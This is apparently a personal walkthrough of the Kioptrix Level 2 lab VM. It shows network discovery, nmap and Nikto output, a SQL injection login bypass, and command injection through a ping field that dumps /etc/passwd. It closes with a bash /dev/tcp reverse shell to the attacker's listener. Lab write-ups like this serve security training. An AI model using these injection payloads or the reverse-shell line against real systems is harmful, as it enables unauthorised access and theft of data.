# Kioptrix L2 Walkthrough

### Network Discoveery

We need to find out the IP of the victim host:

```sudo netdiscover -i eth0```

### Enumerate ports and services

```sudo nmap -sV -O 192.168.1.32```

```
tamosma@kali:~$ sudo nmap -sV -O 192.168.1.32
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-17 18:47 EDT
Nmap scan report for 192.168.1.32
Host is up (0.0017s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
631/tcp  open  ipp        CUPS 1.1
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 9E:86:37:32:02:D7 (Unknown)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

We note that there is not information from the ssl/https version and about the mysql, so we try to find out more suing Nikto:

```nikto -h 192.168.1.32 -p 443```

and the resulut is a bit delusional:

```
nikto -h 192.168.1.32 -p 443
- Nikto v2.1.6
---------------------------------------------------------------------------
+ No web server found on 192.168.1.32:443
---------------------------------------------------------------------------
+ 0 host(s) tested
```

So there is not really an https service working there...


Checking the port 80:

```
  nikto -h 192.168.1.32 -p 80
```

the result:

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.32
+ Target Hostname:    192.168.1.32
+ Target Port:        80
+ Start Time:         2020-03-17 19:07:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-03-17 19:08:07 (GMT-4) (48 seconds)
```

Nikto reports that we may have the capablity of XSS injection, that we have PHP and Apache is outdated... so maybe we can try some XSS or maybe even SQL injection.


### Exploit

We note that the ssh is quite hold! Looking in google for: ``` openssh 3.9p1 release year ```

we find:

``` OpenSSH 3.9 was released on 2004-08-18 ```

so this is a good candidate.

But first I take the hint from Nikto and I go to test for PHP injection on those fields of the web application running at:

```http://192.68.1.32:80```

I put the below string on the username and password field:

```; print phpinfo();```

but nothing comes back, so I give a quick try with the basics of sql injection using mysql syntax:

``` ' or '1'='1 ```

and yes we land to a page that has an input field to specify an IP address... so considering that this is a vulnerable host, we try to inject a Linux command to ping the loaclhost and we attach to it an innocent command to display the users on the system:

```127.0.0.1; cat /etc/passwd```

and the result is:

``` 127.0.0.1; cat /etc/passwd
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.041/0.043/0.045/0.007 ms, pipe 2
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
.....
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
.....
```
So we note we have a user adm, mysql, john,harold...

Let's open a reverse shell and get a better look inside the guest :-)

On the Kali host we run a netcat listener on port 4444:

``` netcat -lvp 4444 ```

and on the webside we run the command:

```127.0.0.1;/bin/bash -i >& /dev/tcp/192.168.1.26/4444 0>&1```

and we are inside the box.